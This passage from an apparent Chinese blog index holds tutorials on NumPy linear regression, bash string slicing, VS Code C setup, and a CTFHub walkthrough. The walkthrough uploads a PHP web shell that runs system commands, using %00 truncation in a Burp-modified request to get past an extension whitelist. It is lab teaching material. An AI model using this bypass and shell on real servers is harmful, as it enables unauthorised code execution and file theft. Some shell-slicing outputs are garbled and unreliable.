        <tag>多项式回归</tag>
        <tag>泰勒展开</tag>
        <tag>python</tag>
        <tag>NumPy</tag>
      </tags>
  </entry>
  <entry>
    <title>numpy实现线性回归模型</title>
    <url>/2022/03/25/numpy%E5%AE%9E%E7%8E%B0%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>生活中常常遇到线性模型的例子，例如房子的价格与占地面积几乎是呈线性，它还可能和卧室数量相关；又如一个学生是否具备获取奖学金资格与学生成绩、参与竞赛经历、班干部任职经历都相关；又如一个大学生是否能够在大学中脱单，与个人相貌、为人处事能力、生活习惯都有联系。</p>
<a id="more"></a>

<h2 id="相关原理"><a href="#相关原理" class="headerlink" title="相关原理"></a>相关原理</h2><p>以预测房子价格为例，如果将房子面积<code>x1</code>、卧室数量<code>x2</code>作为特征，房子价格为目标，则可以表示为：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220325230950.png" alt></p>
<p>式子中的<code>w</code>代表相应的特征权重，<code>b</code>代表偏置。</p>
<p>用向量可以表示为：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220325232055.png" alt></p>
<p>而我们的目标是对于给定数据集，我们求出最符合的参数<code>w1</code>和<code>w2</code>，以及<code>b</code>，使得模型很好地贴近数据集，我们该如何度量我们的模型是否和数据集贴近呢？我们这里平方差来表示二者的差距，计算该平方差的函数我们称之为损失函数，我们的样本的预测值为<code>y_hat</code>，真实值为<code>y</code>，则损失函数如下：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220325232645.png" alt></p>
<p>上面的常数<code>1/2</code>并不是硬性要求，只是为了方便后面求导使得系数变为<code>1</code>。</p>
<p>因此问题转变成找到一组参数，使得所有样本的损失和变得最小，即</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220325233600.png" alt></p>
<p>实际上也是在求上述函数的极小值。为了方便运算，我们可以将参数<code>w</code>和<code>b</code>合并，并在<code>x</code>右边增加一列：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326103156.png" alt></p>
<p>即损失函数又可以表示为：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326082005.png" alt></p>
<p>小学二年级的数学老师告诉我们，这个是关于自变量<code>W*</code>（注意，这里的<code>x</code>和<code>y</code>都是常量）的二次函数，有极值，那我们该怎么求解？数学老师继续告诉我们，二次函数极值可以利用公式！当然也可以使用梯度下降分析法，因为有些模型不可以用公式直接求解极值！</p>
<p>梯度下降分析法参数更新方式是：<code>w = w - learning_rate * grad</code>，<code>grad</code>是在该点的梯度，即导数（可以粗略地称为导数，但是严格来说这样子的说法是错误的）</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326085926.png" alt></p>
<p>如上图所示，对于左边的点，其导数为负数，减去一个负数（<code>learning_rate</code>我们称之为学习率，是正数）后其值增大，即经过更新后，自变量<code>w</code>往右边走了一段距离，对于右边的，更新后自变量往左边走了一段距离，最终我们的<code>w</code>将趋于<code>1.0</code>，即极值点附近。</p>
<p>损失函数对<code>W</code>求导为：</p>
<p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326093933.png" alt></p>
<h2 id="回归实现"><a href="#回归实现" class="headerlink" title="回归实现"></a>回归实现</h2><p>简单起见，我们假设只有一个特征，即只有一个<code>x</code>，而不是有<code>x1,x2,...</code>我们首先生成一组线性数据，为了更符合实际，我们加入随机偏差：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">data</span><span class="params">()</span>:</span></span><br><span class="line">    x = np.linspace(<span class="number">-20</span>, <span class="number">20</span>, <span class="number">50</span>)</span><br><span class="line">    y = <span class="number">2</span>*x + <span class="number">3</span> + np.random.randn(len(x)) * <span class="number">3</span></span><br><span class="line">    x = x.reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">    y = y.reshape(<span class="number">-1</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br></pre></td></tr></table></figure>

<p>然后初始化我们的参数<code>w,b</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    w, b = np.random.randn(), np.random.randn()</span><br><span class="line">    <span class="comment"># 参数合并</span></span><br><span class="line">    <span class="keyword">return</span> np.array([[w],</span><br><span class="line">                     [b]])</span><br></pre></td></tr></table></figure>

<p>定义误差函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l</span><span class="params">(W, X, y)</span>:</span></span><br><span class="line">    WX = np.dot(X, W) - y</span><br><span class="line">    <span class="keyword">return</span> WX ** <span class="number">2</span> / <span class="number">2.0</span></span><br></pre></td></tr></table></figure>

<p>定义损失函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loss</span><span class="params">(W, X, y)</span>:</span></span><br><span class="line">    l_value = l(W, X, y)</span><br><span class="line">    n = X.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> np.sum(l_value) / n</span><br></pre></td></tr></table></figure>

<p>梯度下降法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient_descent</span><span class="params">(W, X, y)</span>:</span></span><br><span class="line">    n = y.shape[<span class="number">0</span>]</span><br><span class="line">    A = np.dot(X, W) - y</span><br><span class="line">    <span class="keyword">return</span> np.dot(X.T, A) / n</span><br></pre></td></tr></table></figure>

<p>开始我们的训练：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">()</span>:</span></span><br><span class="line">    learning_rate, epoch = <span class="number">0.01</span>, <span class="number">100</span></span><br><span class="line">    W = init()</span><br><span class="line">    x, y = data()</span><br><span class="line">    one = np.ones((x.shape[<span class="number">0</span>],<span class="number">1</span>))</span><br><span class="line">    X = np.c_[x, one]</span><br><span class="line">    loss_x, loss_y = np.zeros((epoch, <span class="number">1</span>)), np.zeros((epoch, <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(epoch):</span><br><span class="line">        loss_value = loss(W, X, y)</span><br><span class="line">        print(<span class="string">"epoch = "</span>, i, <span class="string">"loss = "</span>, loss_value)</span><br><span class="line">        loss_x[i] = i</span><br><span class="line">        loss_y[i] = loss_value</span><br><span class="line">        </span><br><span class="line">        grad = gradient_descent(W, X, y)</span><br><span class="line">        W = W - learning_rate * grad</span><br><span class="line">    plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    plt.scatter(x, y)</span><br><span class="line">    plt.plot(X[:, <span class="number">0</span>], np.dot(X, W), color=<span class="string">'red'</span>)</span><br><span class="line">    </span><br><span class="line">    plt.subplot(<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">    plt.title(<span class="string">"loss"</span>)</span><br><span class="line">    plt.plot(loss_x, loss_y)</span><br></pre></td></tr></table></figure>

<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p><img src="https://qiniu.yalexin.top/QQ%E6%88%AA%E5%9B%BE20220326103436.png" alt></p>
<p>可以发现，拟合效果还是挺不错的，损失值下降得也挺快，前面的急剧下降是因为我们是随机初始化的参数，该参数对应的导数可能比较大，因此更新得比较快。</p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>线性回归</tag>
      </tags>
  </entry>
  <entry>
    <title>shell字符串截取</title>
    <url>/2020/04/19/shell%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%88%AA%E5%8F%96/</url>
    <content><![CDATA[<h2 id="使用-号截取右边字符"><a href="#使用-号截取右边字符" class="headerlink" title="使用 # 号截取右边字符"></a>使用 # 号截取右边字符</h2><p>格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;url#*childStr&#125;</span><br></pre></td></tr></table></figure>

<p>childStr可以是字符串或者是特定字符，将返回匹配<strong>第一个</strong><code>childStr</code>后的字符串<a id="more"></a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file_name="test.txt"</span><br><span class="line">echo $&#123;file_name#*.&#125;</span><br></pre></td></tr></table></figure>

<p>将输出<code>txt</code></p>
<p>如果希望匹配<strong>最后一个</strong><code>childStr</code>后的字符串,可以使用<code>##</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_name&#x3D;&quot;test.tar.gz&quot;</span><br><span class="line">echo $&#123;file_name##*.&#125;</span><br></pre></td></tr></table></figure>

<p>将返回<code>gz</code></p>
<h2 id="使用-号截取左边字符"><a href="#使用-号截取左边字符" class="headerlink" title="使用 % 号截取左边字符"></a>使用 % 号截取左边字符</h2><p>格式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;url%childStr*&#125;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">file_name="test.tar.gz"</span><br><span class="line">echo $&#123;file_name%.*&#125;</span><br><span class="line">echo $&#123;file_name%%.*&#125;</span><br></pre></td></tr></table></figure>

<p>将输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test.tar</span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<h2 id="截取指定个数字符串"><a href="#截取指定个数字符串" class="headerlink" title="截取指定个数字符串"></a>截取指定个数字符串</h2><ul>
<li><p>从字符串左边</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">str="abcdefghijkl"</span><br><span class="line">echo $&#123;str:2:100&#125;</span><br></pre></td></tr></table></figure>

<p>输出<code>cdefg</code>，即输出从<code>startIndex</code>开始长度是<code>length</code>的字符串，当<code>length</code>超出最后一个元素的界限或者是缺省时将输出从<code>startIndex</code>直至末尾。</p>
</li>
<li><p>从字符串右边</p>
<p>通常的语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;string: 0-startIndex :length&#125;</span><br></pre></td></tr></table></figure>

<p>例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D;&quot;abcdefghijkl&quot;</span><br><span class="line">echo $&#123;str:0-7:3&#125;</span><br></pre></td></tr></table></figure>

<p>将输出<code>fgh</code>，因为从右边往左边数，c，当然也可以这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D;&quot;abcdefghijkl&quot;</span><br><span class="line">echo $&#123;str:1-7:3&#125;</span><br></pre></td></tr></table></figure>

<p>此时的输出就变成了：<code>ghi</code>,可以这样理解：第七个字符是<code>f</code>，然后再往后偏移一个字符，再从这里开始截取三个字符。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux相关</category>
      </categories>
      <tags>
        <tag>字符串</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>php文件上传00截断</title>
    <url>/2022/06/25/php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A000%E6%88%AA%E6%96%AD/</url>
    <content><![CDATA[<p><code>0x00</code>，<code>%00</code>，<code>/00</code>之类的截断，本质都是一样的，只是不同的表示形式而已。就比如女朋友、女票。</p>
<p>在网站<code>url</code>中，<code>%00</code>会被解码成0，而在<code>ascii</code>中，0是一个特殊字符（并不是字符<code>&#39;0&#39;</code>），表示字符串结束，因此如果<code>url</code>中出现了<code>%00</code>，则意味着解码完毕。</p>
<a id="more"></a>

<p>如：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">https://www.yalexin/?file=test.txt</span><br></pre></td></tr></table></figure>

<p>此时输出的是<code>test.txt</code></p>
<p>如果换成：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">https://www.yalexin/?file=test.php%00.txt</span><br></pre></td></tr></table></figure>

<p>则此时输出的是<code>test.php</code></p>
<p>让我们来看一道例题：</p>
<p><a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">ctfhub 技能树-web-文件上传-00截断</a></p>
<p>打开场景后是一个上传文件的页面，查看源代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'上传成功'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub 文件上传 - 00截断<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub 文件上传 - 00截断<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">?road</span>=<span class="string">/var/www/html/upload/</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">if (!empty($_POST['submit'])) &#123;</span></span><br><span class="line"><span class="comment">    $name = basename($_FILES['file']['name']);</span></span><br><span class="line"><span class="comment">    $info = pathinfo($name);</span></span><br><span class="line"><span class="comment">    $ext = $info['extension'];</span></span><br><span class="line"><span class="comment">    $whitelist = array("jpg", "png", "gif");</span></span><br><span class="line"><span class="comment">    if (in_array($ext, $whitelist)) &#123;</span></span><br><span class="line"><span class="comment">        $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;</span></span><br><span class="line"><span class="comment">        if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) &#123;</span></span><br><span class="line"><span class="comment">            echo "&lt;script&gt;alert('上传成功')&lt;/script&gt;";</span></span><br><span class="line"><span class="comment">        &#125; else &#123;</span></span><br><span class="line"><span class="comment">            echo "&lt;script&gt;alert('上传失败')&lt;/script&gt;";</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125; else &#123;</span></span><br><span class="line"><span class="comment">        echo "文件类型不匹配";</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到源代码中，先是看一下文件的类型是不是在白名单内（即只能上传图片类型），文件类型通过以后，解析<code>road</code>参数值，然后拼接到一个随机数字以及日期作为文件名并上传到指定目录。</p>
<p>经过简单地分析以后，大概知道了思路：使用代理，写一个<code>php</code>脚本，将其扩展名改为图片类型，然后截取数据包、修改数据包，访问我们上传的脚本。</p>
<p>首先查找<code>flag</code>可能的位置：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">'find / | grep flag'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将其文件保存为<code>hack.png</code></p>
<p>然后开启代理，打开<code>Burp Suite</code>软件，并将拦截器（<code>intercept</code>）打开</p>
<p> 在浏览器中上传我们刚刚的<code>hack.png</code></p>
<p>然后我们会在<code>Burp</code>中看到该数据报，我们尝试将</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?road=/var/www/html/upload/</span> HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>改为：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?road=/var/www/html/upload/hack.php%00</span> HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>然后点击<code>forward</code></p>
<p>上传成功以后，我们访问该脚本：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">/upload/hack.php</span><br></pre></td></tr></table></figure>

<p>果然看到了一些内容：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/sys/devices/platform/serial8250/tty/ttyS0/flags /sys/devices/platform/serial8250/tty/ttyS1/flags /sys/devices/pci0000:00/0000:00:03.0/virtio0/net/eth0/flags /sys/devices/virtual/net/lo/flags /sys/devices/virtual/net/dummy0/flags /sys/module/scsi_mod/parameters/default_dev_flags /proc/kpageflags /usr/lib/perl/5.14.2/auto/POSIX/SigAction/flags.al /usr/lib/perl/5.14.2/bits/waitflags.ph /var/www/html/flag_139938352.php</span><br></pre></td></tr></table></figure>

<p>最后的就是我们想要的内容。要读取该文件。</p>
<p>修改我们的脚本<code>hack.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">'cat ../flag_139938352.php'</span>)<span class="comment">//注意，该脚本最终会上传到/var/www/html/upload 文件夹下，因此要回到上一级目录读取 flag</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>按照刚刚的方法继续上传即可读取该内容（<strong>注意</strong>：我们访问hack.php的时候会遇到空白页面，右键查看源码即可看到<code>flag</code>）。</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>vs code（Windows）配置C环境</title>
    <url>/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在前端开发中，有一个非常好用的工具，Visual Studio Code，简称VS code。  它是微软出的一款轻量级代码编辑器，免费而且功能强大，对JavaScript和NodeJS的支持非常好，自带很多功能，例如代码格式化，代码智能提示补全、Emmet插件等。 无数个大言不惭的攻城狮，都被VS code比德芙还丝滑的强大功能所折服。 本篇文章主要是介绍如何配置Windows系统下C环境的配置，C++的配置类似，这里就不再重复。</p>
<a id="more"></a>

<h2 id="1-下载vs-code"><a href="#1-下载vs-code" class="headerlink" title="1.下载vs code"></a>1.下载vs code</h2><p>这里给出<a href="https://code.visualstudio.com/" target="_blank" rel="noopener">官网链接</a></p>
<h2 id="2-下载mingw"><a href="#2-下载mingw" class="headerlink" title="2.下载mingw"></a>2.下载mingw</h2><p>这里给出<a href="http://mingw.org/" target="_blank" rel="noopener">官网链接</a>，如果官网下载太慢，也可以<a href="i686-8.1.0-release-posix-dwarf-rt_v6-rev0.7z">点此下载</a>，然后解压到自己喜欢的地方，但最好路径中不要含有中文。</p>
<h2 id="3-下载插件"><a href="#3-下载插件" class="headerlink" title="3.下载插件"></a>3.下载插件</h2><ul>
<li><p>cpptools</p>
<p>  下载不了的可以从这里下载<a href="http://q78fmp2j4.bkt.clouddn.com/cpptools-win32.vsix" target="_blank" rel="noopener">离线包</a>，在vs code中选择“从VSIX安装”即可</p>
</li>
<li><p>Chinese (Simplified) Language（可选）</p>
</li>
<li><p>Bracket Pair Colorizer（可选）</p>
</li>
</ul>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307102836.png" class>

<h2 id="4-配置环境"><a href="#4-配置环境" class="headerlink" title="4.配置环境"></a>4.配置环境</h2><ol>
<li><p>新建测试文件test.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description: </span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-03-07 10:31:47</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-03-07 10:31:47</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置launch.json</p>
<p>编写完毕上面的代码，然后按下F5，弹出选择环境</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307103653.png" class>

<p>这里选择第一个，然后选择默认配置</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307103911.png" class>

<p>系统就会自动为我们自动生成launch.json，接着把下面的代码粘贴覆盖进去即可：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"version"</span>: <span class="string">"0.2.0"</span>,</span><br><span class="line">    <span class="string">"configurations"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">"C++ Launch (GDB)"</span>,                 <span class="comment">// 配置名称，将会在启动配置的下拉菜单中显示</span></span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"cppdbg"</span>,                           <span class="comment">// 配置类型，这里只能为cppdbg</span></span><br><span class="line">            <span class="string">"request"</span>: <span class="string">"launch"</span>,                        <span class="comment">// 请求配置类型，可以为launch（启动）或attach（附加）</span></span><br><span class="line">            <span class="string">"launchOptionType"</span>: <span class="string">"Local"</span>,                <span class="comment">// 调试器启动类型，这里只能为Local</span></span><br><span class="line">            <span class="string">"targetArchitecture"</span>: <span class="string">"x86"</span>,                <span class="comment">// 生成目标架构，一般为x86或x64，可以为x86, arm, arm64, mips, x64, amd64, x86_64</span></span><br><span class="line">            <span class="string">"program"</span>:   <span class="string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe"</span>,                   <span class="comment">// 将要进行调试的程序的路径</span></span><br><span class="line">            <span class="string">"miDebuggerPath"</span>:<span class="string">"D:/mingw32/bin/gdb.exe"</span>, <span class="comment">// ******************miDebugger的路径，注意这里要与MinGw的路径对应</span></span><br><span class="line">            <span class="string">"args"</span>: [],     <span class="comment">// 程序调试时传递给程序的命令行参数，一般设为空即可</span></span><br><span class="line">            <span class="string">"stopAtEntry"</span>: <span class="literal">false</span>,                       <span class="comment">// 设为true时程序将暂停在程序入口处，一般设置为false</span></span><br><span class="line">            <span class="string">"cwd"</span>: <span class="string">"$&#123;workspaceRoot&#125;"</span>,                  <span class="comment">// 调试程序时的工作目录，一般为$&#123;workspaceRoot&#125;即代码所在目录</span></span><br><span class="line">            <span class="string">"externalConsole"</span>: <span class="literal">true</span>,                    <span class="comment">// 调试时是否显示控制台窗口，一般设置为true显示控制台</span></span><br><span class="line">            <span class="string">"preLaunchTask"</span>: <span class="string">"gcc"</span>　　                  <span class="comment">// *********调试会话开始前执行的任务，一般为编译程序，c++为g++, c为gcc</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>接着将miDebuggerPath的值改为你的MinGw路径。</strong></p>
</li>
<li><p>配置tasks.json</p>
<p>回到test.c，按下F5，你会发现还是不能编译运行我们的程序，别急，我们还需要配置tasks.json，</p>
<p>点击弹出来的信息框中的“配置任务”</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307104828.png" class>

<p>选择“使用模板”</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307104850.png" class>

<p>选择第一个</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307104917.png" class>

<p>然后在生成的tasks中粘贴覆盖下面的代码即可</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"2.0.0"</span>,</span><br><span class="line">    <span class="attr">"tasks"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"label"</span>: <span class="string">"gcc"</span>,</span><br><span class="line">            <span class="attr">"command"</span>: <span class="string">"gcc"</span>,</span><br><span class="line">            <span class="attr">"args"</span>: [</span><br><span class="line">                <span class="string">"$&#123;file&#125;"</span>,</span><br><span class="line">                <span class="string">"-o"</span>,</span><br><span class="line">                <span class="string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe"</span>,</span><br><span class="line">                <span class="string">"-g"</span>,</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"shell"</span>,</span><br><span class="line">            <span class="attr">"group"</span>: &#123;</span><br><span class="line">                <span class="attr">"kind"</span>: <span class="string">"build"</span>,</span><br><span class="line">                <span class="attr">"isDefault"</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"presentation"</span>: &#123;</span><br><span class="line">                <span class="attr">"echo"</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">"reveal"</span>: <span class="string">"always"</span>,</span><br><span class="line">                <span class="attr">"focus"</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">"panel"</span>: <span class="string">"shared"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"shell"</span>,</span><br><span class="line">            <span class="attr">"label"</span>: <span class="string">"gcc.exe build active file"</span>,</span><br><span class="line">            <span class="attr">"command"</span>: <span class="string">"D:\\mingw32\\bin\\gcc.exe"</span>,<span class="comment">//**********这里要改你的路径</span></span><br><span class="line">            <span class="attr">"args"</span>: [</span><br><span class="line">                <span class="string">"-g"</span>,</span><br><span class="line">                <span class="string">"$&#123;file&#125;"</span>,</span><br><span class="line">                <span class="string">"-o"</span>,</span><br><span class="line">                <span class="string">"$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"options"</span>: &#123;</span><br><span class="line">                <span class="attr">"cwd"</span>: <span class="string">"D:\\mingw32\\bin"</span><span class="comment">//**********这里要改你的路径</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"problemMatcher"</span>: [</span><br><span class="line">                <span class="string">"$gcc"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"group"</span>: <span class="string">"build"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>接着将代码中注释部分相应地改为你的路径即可。</strong></p>
</li>
</ol>
<h2 id="5-成功！"><a href="#5-成功！" class="headerlink" title="5.成功！"></a>5.成功！</h2><p>然后你再测试你的test.c，发现可以成功了，但是命令窗口一闪而过，解决的办法是在return语句之前加</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">system(<span class="string">"pause"</span>);</span><br></pre></td></tr></table></figure>

<p>我更推荐使用断点功能来完成</p>
